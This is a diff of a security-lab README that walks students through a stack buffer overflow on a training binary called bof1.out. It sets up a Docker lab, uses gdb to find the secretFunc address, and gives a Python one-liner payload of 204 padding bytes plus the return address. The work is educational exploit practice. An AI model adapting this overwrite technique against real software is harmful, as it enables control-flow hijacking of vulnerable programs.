@@ -1,4 +1,5 @@
-# Exercise-Security
+# Exercise-Security Lab bof1
+
 
 ### Prepare for the lab environment:
 The Dockerfile is used to build docker image with full required packages for Hands-On Assembly & Security labs. <br>
@@ -9,6 +10,8 @@ The Dockerfile is used to build docker image with full required packages for Han
 3. Run docker container from previously built image <br> 
 `$> docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab` <br>
 `Seclabs` is created inside student's home folder
+### Visualize the initial attack idea
+<img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/stackframe.png" />
 ### Conducting the attack
 1. After creating the seclabs folder, continue to create a folder named bof in seclabs <br>
 `$> mdkir bof` <br>
@@ -24,7 +27,15 @@ The Dockerfile is used to build docker image with full required packages for Han
 7. Load vuln.out in gdb <br>
 `$> gdb -q bof1.out` <br>
 8. Get the secretFunc function address <br>
-`$> disas secretFunc`
-<img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/secretFuncAddress.png" />
+`$> disas secretFunc` <br>
+<img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/secretFuncAddress.png" /> <br>
+9. Once we have obtained the secretFunc function address: 0804846b, we must exit gdb <br>
+`$> q`<br>
+11. Overflow memory we need to fill 204 characters + 4 characters of secretFunc function address <br>
+`$>echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out` <br>
+<img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/result.png" /> <br>
+12. Remove the missing arguments line, add the variables a,b,1,2,... to the end of bof1.out
+`$> echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out 1` <br>
+<img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/result1.png" /> <br>
 
    
